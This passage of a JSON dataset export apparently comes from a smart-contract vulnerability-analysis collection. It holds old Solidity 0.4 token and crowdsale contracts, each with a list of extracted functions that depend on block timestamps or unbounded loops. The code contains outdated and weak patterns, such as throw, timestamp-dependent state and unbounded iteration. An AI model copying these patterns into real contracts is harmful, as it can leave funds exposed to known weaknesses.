(bool) {\n return tokensSold >= maximumSellableTokens;\n }\n function setMaximumSellableTokens(uint tokens) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n assert(!lastTierCntrct.finalized());\n maximumSellableTokens = tokens;\n MaximumSellableTokensChanged(maximumSellableTokens);\n }\n function updateRate(uint newOneTokenInWei) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n assert(!lastTierCntrct.finalized());\n pricingStrategy.updateRate(newOneTokenInWei);\n }\n function assignTokens(address receiver, uint tokenAmount) private {\n MintableTokenExt mintableToken = MintableTokenExt(token);\n mintableToken.mint(receiver, tokenAmount);\n }\n}",
  "extract_feature": [
    "function getState() public constant returns (State) {\nif(finalized) return State.Finalized;\nelse if (address(finalizeAgent) == 0) return State.Preparing;\nelse if (!finalizeAgent.isSane()) return State.Preparing;\nelse if (!pricingStrategy.isSane(address(this))) return State.Preparing;\nelse if (block.timestamp < startsAt) return State.PreFunding;\nelse if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\nelse if (isMinimumGoalReached()) return State.Success;\nelse return State.Failure;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f79"
  },
  "filename": "9329.sol",
  "content": "pragma solidity ^0.4.21;\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract MintableToken is StandardToken, Ownable {\n event Mint(address indexed to, uint256 amount);\n event MintFinished();\n bool public mintingFinished = false;\n modifier canMint() {\n require(!mintingFinished);\n _;\n }\n function mint(address _to, uint256 _amount) onlyOwner canMint public returns (bool) {\n totalSupply = totalSupply.add(_amount);\n balances[_to] = balances[_to].add(_amount);\n Mint(_to, _amount);\n Transfer(address(0), _to, _amount);\n return true;\n }\n function finishMinting() onlyOwner canMint public returns (bool) {\n mintingFinished = true;\n MintFinished();\n return true;\n }\n}\ncontract FreezableToken is StandardToken {\n mapping (bytes32 => uint64) internal chains;\n mapping (bytes32 => uint) internal freezings;\n mapping (address => uint) internal freezingBalance;\n event Freezed(address indexed to, uint64 release, uint amount);\n event Released(address indexed owner, uint amount);\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return super.balanceOf(_owner) + freezingBalance[_owner];\n }\n function actualBalanceOf(address _owner) public view returns (uint256 balance) {\n return super.balanceOf(_owner);\n }\n function freezingBalanceOf(address _owner) public view returns (uint256 balance) {\n return freezingBalance[_owner];\n }\n function freezingCount(address _addr) public view returns (uint count) {\n uint64 release = chains[toKey(_addr, 0)];\n while (release != 0) {\n count ++;\n release = chains[toKey(_addr, release)];\n }\n }\n function getFreezing(address _addr, uint _index) public view returns (uint64 _release, uint _balance) {\n for (uint i = 0; i < _index + 1; i ++) {\n _release = chains[toKey(_addr, _release)];\n if (_release == 0) {\n return;\n }\n }\n _balance = freezings[toKey(_addr, _release)];\n }\n function freezeTo(address _to, uint _amount, uint64 _until) public {\n require(_to != address(0));\n require(_amount <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_amount);\n bytes32 currentKey = toKey(_to, _until);\n freezings[currentKey] = freezings[currentKey].add(_amount);\n freezingBalance[_to] = freezingBalance[_to].add(_amount);\n freeze(_to, _until);\n Transfer(msg.sender, _to, _amount);\n emit Freezed(_to, _until, _amount);\n }\n function releaseOnce() public {\n bytes32 headKey = toKey(msg.sender, 0);\n uint64 head = chains[headKey];\n require(head != 0);\n require(uint64(block.timestamp) > head);\n bytes32 currentKey = toKey(msg.sender, head);\n uint64 next = chains[currentKey];\n uint amount = freezings[currentKey];\n delete freezings[currentKey];\n balances[msg.sender] = balances[msg.sender].add(amount);\n freezingBalance[msg.sender] = freezingBalance[msg.sender].sub(amount);\n if (next == 0) {\n delete chains[headKey];\n }\n else {\n chains[headKey] = next;\n delete chains[currentKey];\n }\n emit Released(msg.sender, amount);\n }\n function releaseAll() public returns (uint tokens) {\n uint release;\n uint balance;\n (release, balance) = getFreezing(msg.sender, 0);\n while (release != 0 && block.timestamp > release) {\n releaseOnce();\n tokens += balance;\n (release, balance) = getFreezing(msg.sender, 0);\n }\n }\n function toKey(address _addr, uint _release) internal pure returns (bytes32 result) {\n result = 0x5749534800000000000000000000000000000000000000000000000000000000;\n assembly {\n result := or(result, mul(_addr, 0x10000000000000000))\n result := or(result, _release)\n }\n }\n function freeze(address _to, uint64 _until) internal {\n require(_until > block.timestamp);\n bytes32 key = toKey(_to, _until);\n bytes32 parentKey = toKey(_to, uint64(0));\n uint64 next = chains[parentKey];\n if (next == 0) {\n chains[parentKey] = _until;\n return;\n }\n bytes32 nextKey = toKey(_to, next);\n uint parent;\n while (next != 0 && _until > next) {\n parent = next;\n parentKey = nextKey;\n next = chains[nextKey];\n nextKey = toKey(_to, next);\n }\n if (_until == next) {\n return;\n }\n if (next != 0) {\n chains[key] = next;\n }\n chains[parentKey] = _until;\n }\n}\ncontract ERC223Receiver {\n function tokenFallback(address _from, uint _value, bytes _data) public;\n}\ncontract ERC223Basic is ERC20Basic {\n function transfer(address to, uint value, bytes data) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint value, bytes data);\n}\ncontract SuccessfulERC223Receiver is ERC223Receiver {\n event Invoked(address from, uint value, bytes data);\n function tokenFallback(address _from, uint _value, bytes _data) public {\n emit Invoked(_from, _value, _data);\n }\n}\ncontract FailingERC223Receiver is ERC223Receiver {\n function tokenFallback(address, uint, bytes) public {\n revert();\n }\n}\ncontract ERC223ReceiverWithoutTokenFallback {\n}\ncontract BurnableToken is StandardToken {\n event Burn(address indexed burner, uint256 value);\n function burn(uint256 _value) public {\n require(_value > 0);\n require(_value <= balances[msg.sender]);\n address burner = msg.sender;\n balances[burner] = balances[burner].sub(_value);\n totalSupply = totalSupply.sub(_value);\n Burn(burner, _value);\n }\n}\ncontract Pausable is Ownable {\n event Pause();\n event Unpause();\n bool public paused = false;\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused() {\n require(paused);\n _;\n }\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n Pause();\n }\n function unpause() onlyOwner whenPaused public {\n paused = false;\n Unpause();\n }\n}\ncontract FreezableMintableToken is FreezableToken, MintableToken {\n function mintAndFreeze(address _to, uint _amount, uint64 _until) onlyOwner canMint public returns (bool) {\n totalSupply = totalSupply.add(_amount);\n bytes32 currentKey = toKey(_to, _until);\n freezings[currentKey] = freezings[currentKey].add(_amount);\n freezingBalance[_to] = freezingBalance[_to].add(_amount);\n freeze(_to, _until);\n emit Mint(_to, _amount);\n emit Freezed(_to, _until, _amount);\n emit Transfer(msg.sender, _to, _amount);\n return true;\n }\n}\ncontract Consts {\n uint constant TOKEN_DECIMALS = 18;\n uint8 constant TOKEN_DECIMALS_UINT8 = 18;\n uint constant TOKEN_DECIMAL_MULTIPLIER = 10 ** TOKEN_DECIMALS;\n string constant TOKEN_NAME = \"EJACOIN\";\n string constant TOKEN_SYMBOL = \"EJAC\";\n bool constant PAUSED = false;\n address constant TARGET_USER = 0xB030dC3457e03e6a5c2e9c428Cbd8F104B5282d5;\n bool constant CONTINUE_MINTING = false;\n}\ncontract ERC223Token is ERC223Basic, BasicToken, FailingERC223Receiver {\n using SafeMath for uint;\n function transfer(address _to, uint _value, bytes _data) public returns (bool) {\n uint codeLength;\n assembly {\n codeLength := extcodesize(_to)\n }\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n if(codeLength > 0) {\n ERC223Receiver receiver = ERC223Receiver(_to);\n receiver.tokenFallback(msg.sender, _value, _data);\n }\n emit Transfer(msg.sender, _to, _value, _data);\n return true;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n bytes memory empty;\n return transfer(_to, _value, empty);\n }\n}\ncontract MainToken is Consts, FreezableMintableToken, BurnableToken, Pausable\n , ERC223Token\n{\n event Initialized();\n bool public initialized = false;\n function MainToken() public {\n init();\n transferOwnership(TARGET_USER);\n }\n function init() private {\n require(!initialized);\n initialized = true;\n if (PAUSED) {\n pause();\n }\n address[1] memory addresses = [address(0xb030dc3457e03e6a5c2e9c428cbd8f104b5282d5)];\n uint[1] memory amounts = [uint(250000000000000000000000000)];\n uint64[1] memory freezes = [uint64(0)];\n for (uint i = 0; i < addresses.length; i++) {\n if (freezes[i] == 0) {\n mint(addresses[i], amounts[i]);\n } else {\n mintAndFreeze(addresses[i], amounts[i], freezes[i]);\n }\n }\n if (!CONTINUE_MINTING) {\n finishMinting();\n }\n emit Initialized();\n }\n function name() pure public returns (string _name) {\n return TOKEN_NAME;\n }\n function symbol() pure public returns (string _symbol) {\n return TOKEN_SYMBOL;\n }\n function decimals() pure public returns (uint8 _decimals) {\n return TOKEN_DECIMALS_UINT8;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool _success) {\n require(!paused);\n return super.transferFrom(_from, _to, _value);\n }\n function transfer(address _to, uint256 _value) public returns (bool _success) {\n require(!paused);\n return super.transfer(_to, _value);\n }\n}",
  "extract_feature": [
    "function releaseOnce() public {\nbytes32 headKey = toKey(msg.sender, 0);\nuint64 head = chains[headKey];\nrequire(head != 0);\nrequire(uint64(block.timestamp) > head);\nbytes32 currentKey = toKey(msg.sender, head);\nuint64 next = chains[currentKey];\nuint amount = freezings[currentKey];\ndelete freezings[currentKey];\nbalances[msg.sender] = balances[msg.sender].add(amount);\nfreezingBalance[msg.sender] = freezingBalance[msg.sender].sub(amount);\nif (next == 0) {\ndelete chains[headKey];\n}\nelse {\nchains[headKey] = next;\ndelete chains[currentKey];\n}\nemit Released(msg.sender, amount);\n}",
    "function releaseAll() public returns (uint tokens) {\nuint release;\nuint balance;\n(release, balance) = getFreezing(msg.sender, 0);\nwhile (release != 0 && block.timestamp > release) {\nreleaseOnce();\ntokens += balance;\n(release, balance) = getFreezing(msg.sender, 0);\n}\n}",
    "function freeze(address _to, uint64 _until) internal {\nrequire(_until > block.timestamp);\nbytes32 key = toKey(_to, _until);\nbytes32 parentKey = toKey(_to, uint64(0));\nuint64 next = chains[parentKey];\nif (next == 0) {\nchains[parentKey] = _until;\nreturn;\n}\nbytes32 nextKey = toKey(_to, next);\nuint parent;\nwhile (next != 0 && _until > next) {\nparent = next;\nparentKey = nextKey;\nnext = chains[nextKey];\nnextKey = toKey(_to, next);\n}\nif (_until == next) {\nreturn;\n}\nif (next != 0) {\nchains[key] = next;\n}\nchains[parentKey] = _until;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f7a"
  },
  "filename": "9333.sol",
  "content": "pragma solidity ^0.4.8;\ncontract SafeMath {\n function safeMul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function safeDiv(uint a, uint b) internal returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function safeSub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n}\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\nlibrary SafeMathLibExt {\n function times(uint a, uint b) returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function divides(uint a, uint b) returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function minus(uint a, uint b) returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function plus(uint a, uint b) returns (uint) {\n uint c = a + b;\n assert(c>=a);\n return c;\n }\n}\ncontract Haltable is Ownable {\n bool public halted;\n modifier stopInEmergency {\n if (halted) throw;\n _;\n }\n modifier stopNonOwnersInEmergency {\n if (halted && msg.sender != owner) throw;\n _;\n }\n modifier onlyInEmergency {\n if (!halted) throw;\n _;\n }\n function halt() external onlyOwner {\n halted = true;\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n }\n}\ncontract PricingStrategy {\n address public tier;\n function isPricingStrategy() public constant returns (bool) {\n return true;\n }\n function isSane(address crowdsale) public constant returns (bool) {\n return true;\n }\n function isPresalePurchase(address purchaser) public constant returns (bool) {\n return false;\n }\n function updateRate(uint newOneTokenInWei) public;\n function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);\n}\ncontract FinalizeAgent {\n bool public reservedTokensAreDistributed = false;\n function isFinalizeAgent() public constant returns(bool) {\n return true;\n }\n function isSane() public constant returns (bool);\n function distributeReservedTokens(uint reservedTokensDistributionBatch);\n function finalizeCrowdsale();\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract FractionalERC20Ext is ERC20 {\n uint public decimals;\n uint public minCap;\n}\ncontract CrowdsaleExt is Haltable {\n uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;\n using SafeMathLibExt for uint;\n FractionalERC20Ext public token;\n PricingStrategy public pricingStrategy;\n FinalizeAgent public finalizeAgent;\n string public name;\n address public multisigWallet;\n uint public minimumFundingGoal;\n uint public startsAt;\n uint public endsAt;\n uint public tokensSold = 0;\n uint public weiRaised = 0;\n uint public investorCount = 0;\n bool public finalized;\n bool public isWhiteListed;\n address[] public joinedCrowdsales;\n uint8 public joinedCrowdsalesLen = 0;\n uint8 public joinedCrowdsalesLenMax = 50;\n struct JoinedCrowdsaleStatus {\n bool isJoined;\n uint8 position;\n }\n mapping (address => JoinedCrowdsaleStatus) joinedCrowdsaleState;\n mapping (address => uint256) public investedAmountOf;\n mapping (address => uint256) public tokenAmountOf;\n struct WhiteListData {\n bool status;\n uint minCap;\n uint maxCap;\n }\n bool public isUpdatable;\n mapping (address => WhiteListData) public earlyParticipantWhitelist;\n address[] public whitelistedParticipants;\n uint public ownerTestValue;\n enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized}\n event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);\n event Whitelisted(address addr, bool status, uint minCap, uint maxCap);\n event WhitelistItemChanged(address addr, bool status, uint minCap, uint maxCap);\n event StartsAtChanged(uint newStartsAt);\n event EndsAtChanged(uint newEndsAt);\n function CrowdsaleExt(string _name, address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, bool _isUpdatable, bool _isWhiteListed) {\n owner = msg.sender;\n name = _name;\n token = FractionalERC20Ext(_token);\n setPricingStrategy(_pricingStrategy);\n multisigWallet = _multisigWallet;\n if(multisigWallet == 0) {\n throw;\n }\n if(_start == 0) {\n throw;\n }\n startsAt = _start;\n if(_end == 0) {\n throw;\n }\n endsAt = _end;\n if(startsAt >= endsAt) {\n throw;\n }\n minimumFundingGoal = _minimumFundingGoal;\n isUpdatable = _isUpdatable;\n isWhiteListed = _isWhiteListed;\n }\n function() payable {\n throw;\n }\n function investInternal(address receiver, uint128 customerId) stopInEmergency private {\n if(getState() == State.PreFunding) {\n throw;\n } else if(getState() == State.Funding) {\n if(isWhiteListed) {\n if(!earlyParticipantWhitelist[receiver].status) {\n throw;\n }\n }\n } else {\n throw;\n }\n uint weiAmount = msg.value;\n uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised, tokensSold, msg.sender, token.decimals());\n if(tokenAmount == 0) {\n throw;\n }\n if(isWhiteListed) {\n if(tokenAmount < earlyParticipantWhitelist[receiver].minCap && tokenAmountOf[receiver] == 0) {\n throw;\n }\n if (isBreakingInvestorCap(receiver, tokenAmount)) {\n throw;\n }\n updateInheritedEarlyParticipantWhitelist(receiver, tokenAmount);\n } else {\n if(tokenAmount < token.minCap() && tokenAmountOf[receiver] == 0) {\n throw;\n }\n }\n if(investedAmountOf[receiver] == 0) {\n investorCount++;\n }\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n if(isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold)) {\n throw;\n }\n assignTokens(receiver, tokenAmount);\n if(!multisigWallet.send(weiAmount)) throw;\n Invested(receiver, weiAmount, tokenAmount, customerId);\n }\n function invest(address addr) public payable {\n investInternal(addr, 0);\n }\n function buy() public payable {\n invest(msg.sender);\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.distributeReservedTokens(reservedTokensDistributionBatch);\n }\n }\n function areReservedTokensDistributed() public constant returns (bool) {\n return finalizeAgent.reservedTokensAreDistributed();\n }\n function canDistributeReservedTokens() public constant returns(bool) {\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if ((lastTierCntrct.getState() == State.Success) && !lastTierCntrct.halted() && !lastTierCntrct.finalized() && !lastTierCntrct.areReservedTokensDistributed()) return true;\n return false;\n }\n function finalize() public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.finalizeCrowdsale();\n }\n finalized = true;\n }\n function setFinalizeAgent(FinalizeAgent addr) public onlyOwner {\n assert(address(addr) != address(0));\n assert(address(finalizeAgent) == address(0));\n finalizeAgent = addr;\n if(!finalizeAgent.isFinalizeAgent()) {\n throw;\n }\n }\n function setEarlyParticipantWhitelist(address addr, bool status, uint minCap, uint maxCap) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(maxCap > 0);\n assert(minCap <= maxCap);\n assert(now <= endsAt);\n if (!isAddressWhitelisted(addr)) {\n whitelistedParticipants.push(addr);\n Whitelisted(addr, status, minCap, maxCap);\n } else {\n WhitelistItemChanged(addr, status, minCap, maxCap);\n }\n earlyParticipantWhitelist[addr] = WhiteListData({status:status, minCap:minCap, maxCap:maxCap});\n }\n function setEarlyParticipantWhitelistMultiple(address[] addrs, bool[] statuses, uint[] minCaps, uint[] maxCaps) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(now <= endsAt);\n assert(addrs.length == statuses.length);\n assert(statuses.length == minCaps.length);\n assert(minCaps.length == maxCaps.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n setEarlyParticipantWhitelist(addrs[iterator], statuses[iterator], minCaps[iterator], maxCaps[iterator]);\n }\n }\n function updateInheritedEarlyParticipantWhitelist(address reciever, uint tokensBought) private {\n if (!isWhiteListed) throw;\n if (tokensBought < earlyParticipantWhitelist[reciever].minCap && tokenAmountOf[reciever] == 0) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n crowdsale.updateEarlyParticipantWhitelist(reciever, tokensBought);\n }\n }\n function updateEarlyParticipantWhitelist(address addr, uint tokensBought) public {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(now <= endsAt);\n assert(isTierJoined(msg.sender));\n if (tokensBought < earlyParticipantWhitelist[addr].minCap && tokenAmountOf[addr] == 0) throw;\n uint newMaxCap = earlyParticipantWhitelist[addr].maxCap;\n newMaxCap = newMaxCap.minus(tokensBought);\n earlyParticipantWhitelist[addr] = WhiteListData({status:earlyParticipantWhitelist[addr].status, minCap:0, maxCap:newMaxCap});\n }\n function isAddressWhitelisted(address addr) public constant returns(bool) {\n for (uint i = 0; i < whitelistedParticipants.length; i++) {\n if (whitelistedParticipants[i] == addr) {\n return true;\n break;\n }\n }\n return false;\n }\n function whitelistedParticipantsLength() public constant returns (uint) {\n return whitelistedParticipants.length;\n }\n function isTierJoined(address addr) public constant returns(bool) {\n return joinedCrowdsaleState[addr].isJoined;\n }\n function getTierPosition(address addr) public constant returns(uint8) {\n return joinedCrowdsaleState[addr].position;\n }\n function getLastTier() public constant returns(address) {\n if (joinedCrowdsalesLen > 0)\n return joinedCrowdsales[joinedCrowdsalesLen - 1];\n else\n return address(0);\n }\n function setJoinedCrowdsales(address addr) private onlyOwner {\n assert(addr != address(0));\n assert(joinedCrowdsalesLen <= joinedCrowdsalesLenMax);\n assert(!isTierJoined(addr));\n joinedCrowdsales.push(addr);\n joinedCrowdsaleState[addr] = JoinedCrowdsaleStatus({\n isJoined: true,\n position: joinedCrowdsalesLen\n });\n joinedCrowdsalesLen++;\n }\n function updateJoinedCrowdsalesMultiple(address[] addrs) public onlyOwner {\n assert(addrs.length > 0);\n assert(joinedCrowdsalesLen == 0);\n assert(addrs.length <= joinedCrowdsalesLenMax);\n for (uint8 iter = 0; iter < addrs.length; iter++) {\n setJoinedCrowdsales(addrs[iter]);\n }\n }\n function setStartsAt(uint time) onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(time <= endsAt);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = 0; j < tierPosition; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time >= crowdsale.endsAt());\n }\n startsAt = time;\n StartsAtChanged(startsAt);\n }\n function setEndsAt(uint time) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(startsAt <= time);\n assert(now <= endsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time <= crowdsale.startsAt());\n }\n endsAt = time;\n EndsAtChanged(endsAt);\n }\n function setPricingStrategy(PricingStrategy _pricingStrategy) public onlyOwner {\n assert(address(_pricingStrategy) != address(0));\n assert(address(pricingStrategy) == address(0));\n pricingStrategy = _pricingStrategy;\n if(!pricingStrategy.isPricingStrategy()) {\n throw;\n }\n }\n function setMultisig(address addr) public onlyOwner {\n if(investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {\n throw;\n }\n multisigWallet = addr;\n }\n function isMinimumGoalReached() public constant returns (bool reached) {\n return weiRaised >= minimumFundingGoal;\n }\n function isFinalizerSane() public constant returns (bool sane) {\n return finalizeAgent.isSane();\n }\n function isPricingSane() public constant returns (bool sane) {\n return pricingStrategy.isSane(address(this));\n }\n function getState() public constant returns (State) {\n if(finalized) return State.Finalized;\n else if (address(finalizeAgent) == 0) return State.Preparing;\n else if (!finalizeAgent.isSane()) return State.Preparing;\n else if (!pricingStrategy.isSane(address(this))) return State.Preparing;\n else if (block.timestamp < startsAt) return State.PreFunding;\n else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\n else if (isMinimumGoalReached()) return State.Success;\n else return State.Failure;\n }\n function isCrowdsale() public constant returns (bool) {\n return true;\n }\n modifier inState(State state) {\n if(getState() != state) throw;\n _;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken);\n function isBreakingInvestorCap(address receiver, uint tokenAmount) public constant returns (bool limitBroken);\n function isCrowdsaleFull() public constant returns (bool);\n function assignTokens(address receiver, uint tokenAmount) private;\n}\ncontract StandardToken is ERC20, SafeMath {\n event Minted(address receiver, uint amount);\n mapping(address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n function isToken() public constant returns (bool weAre) {\n return true;\n }\n function transfer(address _to, uint _value) returns (bool success) {\n balances[msg.sender] = safeSub(balances[msg.sender], _value);\n balances[_to] = safeAdd(balances[_to], _value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {\n uint _allowance = allowed[_from][msg.sender];\n balances[_to] = safeAdd(balances[_to], _value);\n balances[_from] = safeSub(balances[_from], _value);\n allowed[_from][msg.sender] = safeSub(_allowance, _value);\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint _value) returns (bool success) {\n if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw;\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract MintableTokenExt is StandardToken, Ownable {\n using SafeMathLibExt for uint;\n bool public mintingFinished = false;\n mapping (address => bool) public mintAgents;\n event MintingAgentChanged(address addr, bool state );\n struct ReservedTokensData {\n uint inTokens;\n uint inPercentageUnit;\n uint inPercentageDecimals;\n bool isReserved;\n bool isDistributed;\n }\n mapping (address => ReservedTokensData) public reservedTokensList;\n address[] public reservedTokensDestinations;\n uint public reservedTokensDestinationsLen = 0;\n bool reservedTokensDestinationsAreSet = false;\n modifier onlyMintAgent() {\n if(!mintAgents[msg.sender]) {\n throw;\n }\n _;\n }\n modifier canMint() {\n if(mintingFinished) throw;\n _;\n }\n function finalizeReservedAddress(address addr) public onlyMintAgent canMint {\n ReservedTokensData storage reservedTokensData = reservedTokensList[addr];\n reservedTokensData.isDistributed = true;\n }\n function isAddressReserved(address addr) public constant returns (bool isReserved) {\n return reservedTokensList[addr].isReserved;\n }\n function areTokensDistributedForAddress(address addr) public constant returns (bool isDistributed) {\n return reservedTokensList[addr].isDistributed;\n }\n function getReservedTokens(address addr) public constant returns (uint inTokens) {\n return reservedTokensList[addr].inTokens;\n }\n function 